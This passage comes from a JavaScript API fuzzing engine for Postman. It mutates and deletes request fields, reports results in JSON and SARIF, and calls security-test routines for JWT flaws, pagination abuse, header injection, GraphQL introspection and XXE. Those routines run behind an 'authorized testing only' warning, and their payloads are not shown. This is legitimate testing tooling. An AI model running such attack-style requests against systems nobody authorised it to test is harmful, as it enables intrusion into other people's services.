            const objectMutations = CONFIG.mutationPolicies.objectMutations || [{}, null, {"key": "value"}];
            
            for (const node of objectNodes.slice(0, 20)) {
                if (checkGlobalTimeout(stats, CONFIG) || checkCircuitBreaker(stats, CONFIG)) return;
                
                for (const mutValue of objectMutations) {
                    const v = Utils.deepCopy(templateOriginal);
                    
                    if (provider && provider.setByPath(v, node.path, mutValue)) {
                        let processed = (bodyFormat === 'json' || bodyFormat === 'graphql') 
                            ? TemplateProcessor.processTemplates(v, {}) 
                            : v;
                        
                        const result = await httpClient.send(
                            method, url, processed,
                            `FUZZ:OBJ:${node.pathStr}=${Utils.safeStringify(mutValue).substring(0, 20)}`,
                            bodyFormat, rateLimiter
                        );
                        
                        if (result) {
                            this.updateStatsFromResult(result, stats, ResponseAnalyzer, CONFIG, Utils);
                            allStagesResults.push(result);
                            stats.stageResults.fuzz.push(result);
                        }
                        
                        if (result?.aborted || ResponseAnalyzer.checkAbort(result, CONFIG)) return;
                        await Utils.delay(CONFIG.delayMs);
                    }
                }
            }
        }
        
        // Fuzz arrays
        if (CONFIG.fuzzing.fuzzArrays && arrayNodes.length > 0) {
            console.log(`\n📊 Fuzzing ${arrayNodes.length} arrays\n`);
            const arrayMutations = CONFIG.mutationPolicies.arrayMutations || [[], null, [[]], [null]];
            
            for (const node of arrayNodes.slice(0, 20)) {
                if (checkGlobalTimeout(stats, CONFIG) || checkCircuitBreaker(stats, CONFIG)) return;
                
                for (const mutValue of arrayMutations) {
                    const v = Utils.deepCopy(templateOriginal);
                    
                    if (provider && provider.setByPath(v, node.path, mutValue)) {
                        let processed = (bodyFormat === 'json' || bodyFormat === 'graphql') 
                            ? TemplateProcessor.processTemplates(v, {}) 
                            : v;
                        
                        const result = await httpClient.send(
                            method, url, processed,
                            `FUZZ:ARR:${node.pathStr}=${Utils.safeStringify(mutValue).substring(0, 20)}`,
                            bodyFormat, rateLimiter
                        );
                        
                        if (result) {
                            this.updateStatsFromResult(result, stats, ResponseAnalyzer, CONFIG, Utils);
                            allStagesResults.push(result);
                            stats.stageResults.fuzz.push(result);
                        }
                        
                        if (result?.aborted || ResponseAnalyzer.checkAbort(result, CONFIG)) return;
                        await Utils.delay(CONFIG.delayMs);
                    }
                }
            }
        }
        
        // Query params
        const queryParams = PostmanAdapter.extractQueryParams();
        const queryKeys = Object.keys(queryParams);
        
        if (queryKeys.length > 0) {
            console.log(`\n🔗 Fuzzing ${queryKeys.length} query parameters\n`);
            
            for (const key of queryKeys) {
                if (checkGlobalTimeout(stats, CONFIG) || checkCircuitBreaker(stats, CONFIG)) return;
                
                for (const mutValue of uniqueMutations.slice(0, 10)) {
                    const modifiedParams = { ...queryParams, [key]: mutValue };
                    const newUrl = PostmanAdapter.buildUrlWithParams(url, modifiedParams);
                    
                    let bodyData = Utils.deepCopy(templateOriginal);
                    if (bodyFormat === 'json' || bodyFormat === 'graphql') {
                        bodyData = TemplateProcessor.processTemplates(bodyData, {});
                    }
                    
                    const result = await httpClient.send(
                        method, newUrl, bodyData,
                        `FUZZ:query.${key}=${Utils.safeStringify(mutValue).substring(0, 20)}`,
                        bodyFormat, rateLimiter
                    );
                    
                    if (result) {
                        this.updateStatsFromResult(result, stats, ResponseAnalyzer, CONFIG, Utils);
                        allStagesResults.push(result);
                        stats.stageResults.fuzz.push(result);
                    }
                    
                    if (result?.aborted || ResponseAnalyzer.checkAbort(result, CONFIG)) return;
                    await Utils.delay(CONFIG.delayMs);
                }
            }
        }
        
        // Security Tests
        if (CONFIG.features.securityTests && SecurityTests) {
            console.log('\n🔒 SECURITY TESTS');
            console.log('⚠️  ATTACK PAYLOADS ACTIVE - Authorized testing only!');
            console.log('⚠️  Abort within 5 seconds by pressing Ctrl+C...\n');
            
            // 5-second warning window
            await new Promise(resolve => {
                let countdown = 5;
                const timer = setInterval(() => {
                    if (countdown > 0) {
                        console.log(`   Starting in ${countdown}...`);
                        countdown--;
                    } else {
                        clearInterval(timer);
                        resolve();
                    }
                }, 1000);
            });
            
            console.log('\n🔒 SECURITY TESTS - EXECUTING\n');
            
            try {
                await SecurityTests.testJWTSecurity(
                    method, url, templateOriginal, bodyFormat, CONFIG, Utils, 
                    TemplateProcessor, httpClient, rateLimiter, stats, ResponseAnalyzer, allStagesResults
                );
                
                await SecurityTests.testPaginationAbuse(
                    method, url, templateOriginal, allNodes, bodyFormat, provider, CONFIG, 
                    Utils, TemplateProcessor, httpClient, rateLimiter, stats, ResponseAnalyzer, 
                    allStagesResults, PostmanAdapter
                );
                
                await SecurityTests.testHeaderInjection(
                    method, url, templateOriginal, bodyFormat, CONFIG, Utils, 
                    TemplateProcessor, httpClient, rateLimiter, stats, ResponseAnalyzer, allStagesResults
                );
                
                if (bodyFormat === 'graphql') {
                    await SecurityTests.testGraphQLIntrospection(
                        method, url, templateOriginal, bodyFormat, CONFIG, Utils, 
                        httpClient, rateLimiter, stats, ResponseAnalyzer, allStagesResults
                    );
                }
                
                if (bodyFormat === 'xml') {
                    await SecurityTests.testXMLXXE(
                        method, url, templateOriginal, bodyFormat, CONFIG, Utils, 
                        httpClient, rateLimiter, stats, ResponseAnalyzer, allStagesResults
                    );
                }
            } catch (error) {
                console.warn(`⚠️ Security tests error: ${error.message}`);
            }
        }
        
        console.log('\n✅ Enhanced fuzzing complete\n');
    },
    
    // STAGE 2: Single Delete
    async executeSingleDelete(method, url, templateOriginal, allNodes, allStagesResults, bodyFormat, provider, CONFIG, Utils, TemplateProcessor, httpClient, rateLimiter, stats, ResponseAnalyzer) {
        if (!CONFIG.stages.singleDelete) return;
        
        console.log('\n🗑️ STAGE 2: SINGLE DELETE\n');
        ResponseAnalyzer.resetAbortCounters();
        
        let deleteNodes = this.getDeleteableNodes(allNodes, bodyFormat, CONFIG, Utils);
        deleteNodes = Utils.sortBottomUp(deleteNodes);
        
        console.log(`Testing ${deleteNodes.length} deletions\n`);
        
        for (const node of deleteNodes) {
            if (checkGlobalTimeout(stats, CONFIG) || checkCircuitBreaker(stats, CONFIG)) return;
            
            const v = Utils.deepCopy(templateOriginal);
            
            if (provider && provider.deleteByPath(v, node.path)) {
                let processed = (bodyFormat === 'json' || bodyFormat === 'graphql') 
                    ? TemplateProcessor.processTemplates(v, {}) 
                    : v;
                
                const result = await httpClient.send(
                    method, url, processed, `DEL-S:${node.pathStr}`, bodyFormat, rateLimiter
                );
                
                if (result) {
                    this.updateStatsFromResult(result, stats, ResponseAnalyzer, CONFIG, Utils);
                    allStagesResults.push(result);
                    stats.stageResults.singleDelete.push(result);
                    ResponseAnalyzer.detectRequiredField(node.pathStr, result.code, result.responseBody, stats);
                }
                
                if (result?.aborted || ResponseAnalyzer.checkAbort(result, CONFIG)) return;
                await Utils.delay(CONFIG.delayMs);
            }
        }
        
        console.log('✅ Single delete complete\n');
    },
    
    // STAGE 3: Cumulative Delete
    async executeCumulativeDelete(method, url, templateOriginal, allNodes, allStagesResults, bodyFormat, provider, CONFIG, Utils, TemplateProcessor, httpClient, rateLimiter, stats, ResponseAnalyzer) {
        if (!CONFIG.stages.cumulativeDelete) return;
        
        console.log('\n🗑️🗑️ STAGE 3: CUMULATIVE DELETE\n');
        ResponseAnalyzer.resetAbortCounters();
        
        let primitives = this.getPrimitiveNodes(allNodes, bodyFormat);
        const cfg = CONFIG.stage3Config;
        const combinations = [];
        
        if (cfg.startWithPairs && primitives.length >= 2) {
            for (let i = 0; i < primitives.length - 1; i++) {
                for (let j = i + 1; j < primitives.length; j++) {
                    combinations.push([primitives[i], primitives[j]]);
                    if (combinations.length >= cfg.maxCombinations) break;
                }
                if (combinations.length >= cfg.maxCombinations) break;
            }
        }
        
        if (combinations.length < cfg.maxCombinations) {
            for (let size = 3; size <= Math.min(cfg.maxFieldsPerCombo, primitives.length); size++) {
                const remaining = cfg.maxCombinations - combinations.length;
                const combos = this.generateCombinations(primitives, size, remaining);
                combinations.push(...combos);
                if (combinations.length >= cfg.maxCombinations) break;
            }
        }
        
        console.log(`Generated ${combinations.length} combinations\n`);
        
        for (const combo of combinations) {
            if (checkGlobalTimeout(stats, CONFIG) || checkCircuitBreaker(stats, CONFIG)) return;
            
            const v = Utils.deepCopy(templateOriginal);
            const sortedCombo = Utils.sortBottomUp(combo);
            let deletedCount = 0;
            const deletedNodes = [];
            
            for (const node of sortedCombo) {
                if (provider && provider.deleteByPath(v, node.path)) {
                    deletedCount++;
                    deletedNodes.push(node);
                }
            }
            
            if (deletedCount > 0) {
                const label = `DEL-C[${deletedCount}]:${deletedNodes.map(n => n.pathStr).join('+')}`;
                
                let processed = (bodyFormat === 'json' || bodyFormat === 'graphql') 
                    ? TemplateProcessor.processTemplates(v, {}) 
                    : v;
                
                const result = await httpClient.send(
                    method, url, processed, label, bodyFormat, rateLimiter
                );
                
                if (result) {
                    this.updateStatsFromResult(result, stats, ResponseAnalyzer, CONFIG, Utils);
                    allStagesResults.push(result);
                    stats.stageResults.cumulativeDelete.push(result);
                }
                
                if (result?.aborted || ResponseAnalyzer.checkAbort(result, CONFIG)) return;
                await Utils.delay(CONFIG.delayMs);
            }
        }
        
        console.log('✅ Cumulative delete complete\n');
    },
    
    // Helper Functions
    getFuzzableNodes(allNodes, bodyFormat, nodeType, CONFIG, Utils) {
        let nodes = [];
        
        if (bodyFormat === 'formdata') {
            nodes = allNodes.filter(n => 
                (n.formDataType === 'text' || n.formDataType === 'file') && 
                Utils.isAllowed(n.path, CONFIG)
            );
        } else if (bodyFormat === 'urlencoded' || bodyFormat === 'json') {
            if (nodeType === 'primitive') {
                nodes = allNodes.filter(n => 
                    n.valueType === 'primitive' && 
                    n.path.length > 0 && 
                    Utils.isAllowed(n.path, CONFIG)
                );
            } else if (nodeType === 'object') {
                nodes = allNodes.filter(n => 
                    n.valueType === 'object' && 
                    n.path.length > 0 && 
                    Utils.isAllowed(n.path, CONFIG)
                );
            } else if (nodeType === 'array') {
                nodes = allNodes.filter(n => 
                    n.valueType === 'array' && 
                    n.path.length > 0 && 
                    Utils.isAllowed(n.path, CONFIG)
                );
            }
        } else if (bodyFormat === 'graphql') {
            nodes = allNodes.filter(n => 
                n.path[0] === 'variables' &&
                n.path.length > 1 && 
                (nodeType ? n.valueType === nodeType : true) &&
                Utils.isAllowed(n.path, CONFIG)
            );
        }
        
        return nodes;
    },
    
    getDeleteableNodes(allNodes, bodyFormat, CONFIG, Utils) {
        return this.getFuzzableNodes(allNodes, bodyFormat, 'primitive', CONFIG, Utils);
    },
    
    getPrimitiveNodes(allNodes, bodyFormat) {
        if (bodyFormat === 'formdata') {
            return allNodes.filter(n => n.formDataType === 'text');
        } else if (bodyFormat === 'urlencoded' || bodyFormat === 'json') {
            return allNodes.filter(n => 
                n.valueType === 'primitive' && 
                n.path.length > 0
            );
        } else if (bodyFormat === 'graphql') {
            return allNodes.filter(n => 
                n.valueType === 'primitive' && 
                n.path[0] === 'variables' &&
                n.path.length > 1
            );
        }
        return [];
    },
    
    generateCombinations(array, size, maxResults) {
        maxResults = maxResults || Infinity;
        const result = [];
        
        const combine = (start, combo) => {
            if (result.length >= maxResults) return;
            
            if (combo.length === size) {
                result.push(combo.slice());
                return;
            }
            
            for (let i = start; i < array.length; i++) {
                if (result.length >= maxResults) break;
                combo.push(array[i]);
                combine(i + 1, combo);
                combo.pop();
            }
        };
        
        combine(0, []);
        return result;
    },
    
    updateStatsFromResult(result, stats, ResponseAnalyzer, CONFIG, Utils) {
        stats.total++;
        stats.codes[result.code] = (stats.codes[result.code] || 0) + 1;
        if (result.responseTime) stats.responseTimes.push(result.responseTime);
        
        const errorType = ResponseAnalyzer.classifyError(result.code, result.responseBody, result.response, CONFIG);
        const signature = ResponseAnalyzer.createSignature(result.code, result.responseBody, result.response, Utils);
        
        result.errorClass = errorType;
        result.signature = signature;
        
        if (CONFIG.logShowResponse) {
            const icon = result.code >= 500 ? '💥' : result.code >= 400 ? '⚠️' : '✅';
            console.log(`${icon} [${result.code}] ${result.label} (${result.responseTime || 0}ms)`);
        }
    }
};

console.log('✅ Mutation Stages v24.1.0 - Security tests integrated');

// ============================================================================
// ENGINE v24.1.0 - Module 08: Reporting & Validation
// ============================================================================

const validateRequiredVariables = function(templateOriginal, bodyFormat, CONFIG, TemplateProcessor) {
    if (!CONFIG.strictVariables) return;
    
    let jsonStr = '';
    
    if (bodyFormat === 'json' || bodyFormat === 'graphql') {
        jsonStr = JSON.stringify(templateOriginal);
    } else if (bodyFormat === 'formdata' || bodyFormat === 'urlencoded') {
        if (Array.isArray(templateOriginal)) {
            jsonStr = JSON.stringify(templateOriginal.map(item => item.value));
        }
    } else if (bodyFormat === 'xml') {
        jsonStr = templateOriginal;
    } else {
        return;
    }
    
    const allVariables = new Set();
    const regex = /\{\{([^}]+)\}\}/g;
    let match;
    
    while ((match = regex.exec(jsonStr)) !== null) {
        const varName = match[1];
        const isDynamic = typeof DYNAMIC_VARIABLES !== 'undefined' &&
                         DYNAMIC_VARIABLES.some(dv => varName.includes(dv));
        
        if (!isDynamic) {
            allVariables.add(match[0]);
        }
    }
    
    const missingVars = [];
    for (const varTemplate of allVariables) {
        try {
            if (typeof pm === 'undefined' || !pm.variables) continue;
            
            const resolved = pm.variables.replaceIn(varTemplate);
            
            if (resolved === varTemplate || resolved === '') {
                const varName = varTemplate.replace(/[{}]/g, '');
                missingVars.push(varName);
            }
        } catch (err) {
            const varName = varTemplate.replace(/[{}]/g, '');
            missingVars.push(varName);
        }
    }
    
    if (missingVars.length > 0) {
        const errorMsg = `Missing or empty variables: ${missingVars.join(', ')}`;
        
        console.error('\n╔═══════════════════════════════════════════════════════════╗');
        console.error('║                     ⚠️ FATAL ERROR                        ║');
        console.error('╚═══════════════════════════════════════════════════════════╝');
        console.error(`\n${errorMsg}`);
        console.error('\nPlease set these variables before running the script.');
        
        console.log('\n💡 How to fix (add to Pre-request Script BEFORE engine code):');
        missingVars.forEach(v => {
            console.log(`   pm.collectionVariables.set('${v}', <value>);`);
        });
        
        throw new Error(errorMsg);
    }
    
    console.log('✅ Variable validation passed\n');
};

const printSummary = function(stats, ENGINE_VERSION, CONFIG, BugClustering, PostmanAdapter) {
    const duration = ((Date.now() - stats.startTime) / 1000).toFixed(1);
    const avgResp = stats.responseTimes.length
        ? Math.round(stats.responseTimes.reduce((a, b) => a + b, 0) / stats.responseTimes.length)
        : 0;
    
    console.log('\n╔═══════════════════════════════════════════════════════════╗');
    console.log(`║          FUZZING SUMMARY v${ENGINE_VERSION}         ║`);
    console.log('╚═══════════════════════════════════════════════════════════╝\n');
    
    console.log('📊 EXECUTION');
    console.log('────────────────────────────────────');
    console.log(`Requests:   ${stats.total} | Skipped: ${stats.skipped}`);
    console.log(`Duration:   ${duration}s | Avg: ${avgResp}ms`);
    console.log(`Format:     ${stats.bodyFormat.toUpperCase()}`);
    
    // Security tests summary
    const secTotal = Object.values(stats.securityTests).reduce((a, b) => a + b, 0);
    if (secTotal > 0) {
        console.log('\n🔒 SECURITY TESTS');
        console.log('────────────────────────────────────');
        if (stats.securityTests.jwt > 0) {
            console.log(`JWT:        ${stats.securityTests.jwt} tests`);
        }
        if (stats.securityTests.pagination > 0) {
            console.log(`Pagination: ${stats.securityTests.pagination} tests`);
        }
        if (stats.securityTests.headerInjection > 0) {
            console.log(`Headers:    ${stats.securityTests.headerInjection} tests`);
        }
        if (stats.securityTests.graphqlIntrospection > 0) {
            console.log(`GraphQL:    ${stats.securityTests.graphqlIntrospection} tests`);
        }
        if (stats.securityTests.xxe > 0) {
            console.log(`XXE:        ${stats.securityTests.xxe} tests`);
        }
    }
    
    if (stats.baselineVerdict) {
        console.log('\n🎯 BASELINE');
        console.log('────────────────────────────────────');
        const emoji = stats.baselineVerdict === 'STABLE' ? '✅' : 
                     stats.baselineVerdict === 'FAILING' ? '💥' : '⚠️';
        console.log(`Verdict: ${emoji} ${stats.baselineVerdict}`);
    }
    
    if (stats.abortReasons.length > 0) {
        console.log('\n🛑 ABORTED');
        console.log('────────────────────────────────────');
        stats.abortReasons.forEach((r, i) => console.log(`${i + 1}. ${r}`));
    }
    
    console.log('\n📢 HTTP CODES');
    console.log('────────────────────────────────────');
    if (stats.total > 0) {
        const sorted = Object.entries(stats.codes).sort((a, b) => b[1] - a[1]);
        for (const [code, count] of sorted) {
            const pct = ((count / stats.total) * 100).toFixed(1);
            const emoji = code >= 500 ? '💥' : code >= 400 ? '⚠️' : code === 'TIMEOUT' ? '⏱️' : '✅';
            console.log(`${emoji} [${String(code).padEnd(7)}]: ${String(count).padStart(4)} (${pct}%)`);
        }
    }
    
    if (stats.bugClusters.size > 0) {
        console.log('\n🧬 BUG CLUSTERS');
        console.log('────────────────────────────────────');
        const sortedClusters = BugClustering.getSortedClusters(stats.bugClusters);
        sortedClusters.slice(0, 10).forEach((cluster, idx) => {
            console.log(`${idx + 1}. [${cluster.code}] ${cluster.errorClass || 'UNKNOWN'} - ${cluster.count}× occurrences`);
        });
        if (sortedClusters.length > 10) {
            console.log(`  ... +${sortedClusters.length - 10} more clusters`);
        }
    }
    
    if (stats.requiredFields.size > 0) {
        console.log('\n🔒 REQUIRED FIELDS');
        console.log('────────────────────────────────────');
        const fields = Array.from(stats.requiredFields).slice(0, 10);
        fields.forEach(f => console.log(`  - ${f}`));
        if (stats.requiredFields.size > 10) {
            console.log(`  ... +${stats.requiredFields.size - 10} more`);
        }
    }
    
    console.log('\n────────────────────────────────────\n');
    
    if (CONFIG.features.postmanTest) {
        const totalBugs = stats.failureSignatures.size || stats.bugClusters.size;
        if (totalBugs > 0) {
            PostmanAdapter.setTest(
                `Fuzzing v${ENGINE_VERSION}: Found ${totalBugs} unique bugs`,
                () => pm.expect(totalBugs).to.be.above(0),
                CONFIG
            );
        } else {
            PostmanAdapter.setTest(
                `Fuzzing v${ENGINE_VERSION}: No bugs found`,
                () => pm.expect(stats.baselineVerdict).to.equal('STABLE'),
                CONFIG
            );
        }
    }
};

console.log('✅ Reporting v24.1.0 - Security summary added');

// ============================================================================
// ENGINE v24.1.0 - Module 10: JSON Summary Report
// ============================================================================

const JSONSummaryReport = {
    
    generateExecutionId: function(stats) {
        const timestamp = stats.startTime || Date.now();
        const counter = stats.total || 0;
        return `exec_${timestamp}_${counter}`;
    },
    
    detectEnvironment: function(RUNTIME) {
        if (RUNTIME.isNewman) return 'newman';
        if (typeof process !== 'undefined' && 
            (process.env.CI || process.env.GITHUB_ACTIONS || process.env.GITLAB_CI)) {
            return 'ci';
        }
        return 'postman';
    },
    
    classifyFindings: function(stats) {
        const findings = {
            critical: 0,
            warning: 0,
            info: 0
        };
        
        if (!stats || !stats.bugClusters) return findings;
        
        for (const cluster of stats.bugClusters.values()) {
            if (cluster.code >= 500) {
                findings.critical++;
            } else if (cluster.code >= 400) {
                findings.warning++;
            } else {
                findings.info++;
            }
        }
        
        return findings;
    },
    
    collectExecutedStages: function(stats) {
        const stages = [];
        
        if (!stats || !stats.stageResults) return stages;
        
        if (stats.stageResults.baseline && stats.stageResults.baseline.length > 0) {
            stages.push('baseline');
        }
        if (stats.stageResults.fuzz && stats.stageResults.fuzz.length > 0) {
            stages.push('fuzz');
        }
        if (stats.stageResults.singleDelete && stats.stageResults.singleDelete.length > 0) {
            stages.push('singleDelete');
        }
        if (stats.stageResults.cumulativeDelete && stats.stageResults.cumulativeDelete.length > 0) {
            stages.push('cumulativeDelete');
        }
        
        return stages;
    },
    
    generate: function(stats, ENGINE_VERSION, RUNTIME) {
        try {
            const durationMs = stats.startTime ? (Date.now() - stats.startTime) : 0;
            const aborted = stats.abortReasons && stats.abortReasons.length > 0;
            
            const summary = {
                engineVersion: ENGINE_VERSION || 'unknown',
                executionId: this.generateExecutionId(stats),
                environment: this.detectEnvironment(RUNTIME || {}),
                
                summary: {
                    totalRequests: stats.total || 0,
                    skippedRequests: stats.skipped || 0,
                    stagesExecuted: this.collectExecutedStages(stats),
                    
                    findings: this.classifyFindings(stats),
                    
                    aborted: aborted,
                    abortReasons: aborted ? (stats.abortReasons || []) : [],
                    
                    durationMs: durationMs,
                    durationSeconds: (durationMs / 1000).toFixed(2)
                },
                
                baseline: {
                    verdict: stats.baselineVerdict || 'unknown',
                    stable: stats.baselineVerdict === 'STABLE'
                },
                
                httpCodes: stats.codes || {},
                
                bodyFormat: stats.bodyFormat || 'unknown',
                
                securityTests: stats.securityTests || {
                    jwt: 0,
                    pagination: 0,
                    headerInjection: 0,
                    graphqlIntrospection: 0,
                    xxe: 0
                },
                
                performance: {
                    avgResponseTimeMs: stats.responseTimes && stats.responseTimes.length > 0
                        ? Math.round(stats.responseTimes.reduce((a, b) => a + b, 0) / stats.responseTimes.length)
                        : 0,
                    minResponseTimeMs: stats.responseTimes && stats.responseTimes.length > 0
                        ? Math.min(...stats.responseTimes)
                        : 0,
                    maxResponseTimeMs: stats.responseTimes && stats.responseTimes.length > 0
                        ? Math.max(...stats.responseTimes)
                        : 0
                },
                
                metadata: {
                    timestamp: new Date().toISOString(),
                    runtime: RUNTIME.isNewman ? 'newman' : 'postman'
                }
            };
            
            return summary;
            
        } catch (error) {
            console.warn(`⚠️ JSON Summary generation failed: ${error.message}`);
            
            // Fallback minimal report
            return {
                engineVersion: ENGINE_VERSION || 'unknown',
                executionId: 'error_' + Date.now(),
                environment: 'unknown',
                error: error.message,
                summary: {
                    totalRequests: 0,
                    findings: { critical: 0, warning: 0, info: 0 },
                    aborted: true
                }
            };
        }
    },
    
    export: function(summary, CONFIG) {
        if (!CONFIG || !CONFIG.features || !CONFIG.features.jsonSummary) {
            return;
        }
        
        try {
            console.log('\n📊 JSON SUMMARY REPORT');
            console.log('─'.repeat(60));
            console.log(JSON.stringify(summary, null, 2));
            console.log('─'.repeat(60) + '\n');
        } catch (error) {
            console.warn(`⚠️ JSON Summary export failed: ${error.message}`);
        }
    }
};

if (typeof module !== 'undefined' && module.exports) {
    module.exports = { JSONSummaryReport };
}

console.log('✅ Module 10: JSON Summary Report - LOADED');

// ============================================================================
// ENGINE v24.1.0 - Module 11: SARIF Report Generator
// ============================================================================

const SARIFReport = {
    
    mapSeverity: function(code, errorClass) {
        // SARIF levels: error, warning, note, none
        
        if (code >= 500) return 'error';
        if (code >= 400 && code < 500) return 'warning';
        if (code === 0) return 'error'; // network errors
        
        if (errorClass === 'serverCrash') return 'error';
        if (errorClass === 'auth') return 'warning';
        if (errorClass === 'validation') return 'note';
        
        return 'note';
    },
    
    generateReplayId: function(result, index) {
        const timestamp = result.timestamp || Date.now();
        const code = result.code || 0;
        const label = result.label || 'unknown';
        
        const hash = this.simpleHash(`${timestamp}_${code}_${label}_${index}`);
        return `replay_${hash}`;
    },
    
    simpleHash: function(str) {
        let hash = 5381;
        for (let i = 0; i < str.length; i++) {
            hash = ((hash << 5) + hash) + str.charCodeAt(i);
        }
        return (hash >>> 0).toString(36);
    },
    
    extractMessage: function(result) {
        if (result.error) {
            return result.error;
        }
        
        if (result.responseBody) {
            try {
                const body = typeof result.responseBody === 'string' 
                    ? result.responseBody 
                    : JSON.stringify(result.responseBody);
                
                return body.length > 200 ? body.substring(0, 200) + '...' : body;
            } catch {
                return 'Response body unavailable';
            }
        }
        
        return `HTTP ${result.code} response`;
    },
    
    createSARIFResult: function(result, index, replayId) {
        const level = this.mapSeverity(result.code, result.errorClass);
        const message = this.extractMessage(result);
        
        return {
            ruleId: result.errorClass || 'unknown-error',
            level: level,
            message: {
                text: message
            },
            locations: [{
                physicalLocation: {
                    artifactLocation: {
                        uri: 'api-request',
                        uriBaseId: '%SRCROOT%'
                    },
                    region: {
                        startLine: 1,
                        snippet: {
                            text: result.label || 'unknown mutation'
                        }
                    }
                }
            }],
            properties: {
                replayId: replayId,
                httpCode: result.code,
                errorClass: result.errorClass || 'unknown',
                signature: result.signature || 'unknown',
                responseTime: result.responseTime || 0,
                stage: this.detectStage(result.label)
            }
        };
    },
    
    detectStage: function(label) {
        if (!label) return 'unknown';
        
        if (label.startsWith('BASELINE')) return 'baseline';
        if (label.startsWith('FUZZ')) return 'fuzz';
        if (label.startsWith('DEL-S')) return 'singleDelete';
        if (label.startsWith('DEL-C')) return 'cumulativeDelete';
        if (label.startsWith('JWT')) return 'security-jwt';
        if (label.startsWith('PAGINATION')) return 'security-pagination';
        if (label.startsWith('HEADER')) return 'security-header';
        if (label.startsWith('GRAPHQL')) return 'security-graphql';
        if (label.startsWith('XXE')) return 'security-xxe';
        
        return 'unknown';
    },
    
    createSARIFRules: function(bugClusters) {
        const rules = [];
        const seenRules = new Set();
        
        if (!bugClusters) return rules;
        
        for (const cluster of bugClusters.values()) {
            const ruleId = cluster.errorClass || 'unknown-error';
            
            if (seenRules.has(ruleId)) continue;
            seenRules.add(ruleId);
            
            rules.push({
                id: ruleId,
                name: ruleId,
                shortDescription: {
                    text: `HTTP ${cluster.code} - ${ruleId}`
                },
                fullDescription: {
                    text: `API mutation resulted in ${cluster.code} response (${ruleId})`
                },
                defaultConfiguration: {
                    level: this.mapSeverity(cluster.code, cluster.errorClass)
                },
                help: {
                    text: `This finding was detected during API fuzzing. Review the mutation that triggered this response.`
                }
            });
        }
        
        const securityRules = [
            { id: 'jwt-vulnerability', name: 'JWT Security Issue', level: 'error' },
            { id: 'pagination-abuse', name: 'Pagination Abuse', level: 'warning' },
            { id: 'header-injection', name: 'Header Injection', level: 'error' },
            { id: 'graphql-introspection', name: 'GraphQL Introspection', level: 'note' },
            { id: 'xxe-attack', name: 'XXE Vulnerability', level: 'error' }
        ];
        
        for (const rule of securityRules) {
            if (!seenRules.has(rule.id)) {
                rules.push({
                    id: rule.id,
                    name: rule.name,
                    shortDescription: { text: rule.name },
                    fullDescription: { text: `Security test: ${rule.name}` },
                    defaultConfiguration: { level: rule.level },
                    help: { text: `Security vulnerability detected during testing` }
                });
            }
        }
        
        return rules;
    },
    
    generate: function(allStagesResults, stats, ENGINE_VERSION) {
        try {
            const results = [];
            const replayMap = {};
            
            // Фильтруем только findings (code >= 400 или code === 0)
            const findings = (allStagesResults || []).filter(r => 
                r && (r.code >= 400 || r.code === 0)
            );
            
            findings.forEach((result, index) => {
                const replayId = this.generateReplayId(result, index);
                replayMap[result.label] = replayId;
                
                results.push(this.createSARIFResult(result, index, replayId));
            });
            
            const rules = this.createSARIFRules(stats.bugClusters);
            
            const sarifReport = {
                version: '2.1.0',
                '$schema': 'https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/Schemata/sarif-schema-2.1.0.json',
                
                runs: [{
                    tool: {
                        driver: {
                            name: 'ENGINE Fuzzer',
                            version: ENGINE_VERSION || 'unknown',
                            informationUri: 'https://github.com/your-org/engine-fuzzer',
                            rules: rules
                        }
                    },
                    
                    results: results,
                    
                    invocations: [{
                        executionSuccessful: !stats.abortReasons || stats.abortReasons.length === 0,
                        exitCode: 0,
                        startTimeUtc: new Date(stats.startTime).toISOString(),
                        endTimeUtc: new Date().toISOString()
                    }],
                    
                    properties: {
                        engineVersion: ENGINE_VERSION,
                        totalRequests: stats.total || 0,
                        findings: {
                            critical: results.filter(r => r.level === 'error').length,
                            warning: results.filter(r => r.level === 'warning').length,
                            info: results.filter(r => r.level === 'note').length
                        },
                        replayMap: replayMap
                    }
                }]
            };
            
            return sarifReport;
            
        } catch (error) {
            console.warn(`⚠️ SARIF report generation failed: ${error.message}`);
            
            // Minimal fallback SARIF
            return {
                version: '2.1.0',
                '$schema': 'https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/Schemata/sarif-schema-2.1.0.json',
                runs: [{
                    tool: {
                        driver: {
                            name: 'ENGINE Fuzzer',
                            version: ENGINE_VERSION || 'unknown'
                        }
                    },
                    results: [],
                    invocations: [{
                        executionSuccessful: false,
                        exitCode: 1
                    }]
                }]
            };
        }
    },
    
    export: function(sarifReport, CONFIG) {
        if (!CONFIG || !CONFIG.features || !CONFIG.features.sarifReport) {
            return;
        }
        
        try {
            console.log('\n🔍 SARIF REPORT (GitHub Code Scanning compatible)');
            console.log('─'.repeat(60));
            console.log(JSON.stringify(sarifReport, null, 2));
            console.log('─'.repeat(60) + '\n');
        } catch (error) {
            console.warn(`⚠️ SARIF report export failed: ${error.message}`);
        }
    }
};

if (typeof module !== 'undefined' && module.exports) {
    module.exports = { SARIFReport };
}

console.log('✅ Module 11: SARIF Report Generator - LOADED');

// ============================================================================
// ENGINE v24.1.0 - Module 12: Replay Mode
// ============================================================================

const ReplayMode = {
    
    maskSecrets: function(obj, SECURITY_CONFIG) {
        if (!SECURITY_CONFIG || !SECURITY_CONFIG.enabled) {
            return obj;
        }
        
        const patterns = SECURITY_CONFIG.sensitivePatterns || [];
        const maskChar = SECURITY_CONFIG.maskChar || '*';
        const maskLength = SECURITY_CONFIG.maskLength || 8;
        
        const mask = maskChar.repeat(maskLength);
        
        const maskValue = (key, value) => {
            // Проверяем ключ на sensitive patterns
            const keyLower = String(key).toLowerCase();
            const isSensitive = patterns.some(pattern => 
                keyLower.includes(pattern.toLowerCase())
            );
            
            if (isSensitive) {
                if (typeof value === 'string') {
                    return value.length > 0 ? mask : '';
                }
                return mask;
            }
            
            return value;
        };
        
        const maskRecursive = (obj) => {
            if (obj === null || typeof obj !== 'object') {
                return obj;
            }
            
            if (Array.isArray(obj)) {
                return obj.map(item => maskRecursive(item));
            }
            
            const result = {};
            for (const key in obj) {
                if (obj.hasOwnProperty(key)) {
                    const value = obj[key];
                    
                    if (value !== null && typeof value === 'object') {
                        result[key] = maskRecursive(value);
                    } else {
                        result[key] = maskValue(key, value);
                    }
                }
            }
            return result;
        };
        
        try {
            return maskRecursive(obj);
        } catch (error) {
            console.warn(`⚠️ Secret masking failed: ${error.message}`);
            return { error: 'MASKED' };
        }
    },
    
    maskHeaders: function(headers, SECURITY_CONFIG) {
        if (!headers || typeof headers !== 'object') {
            return {};
        }
        
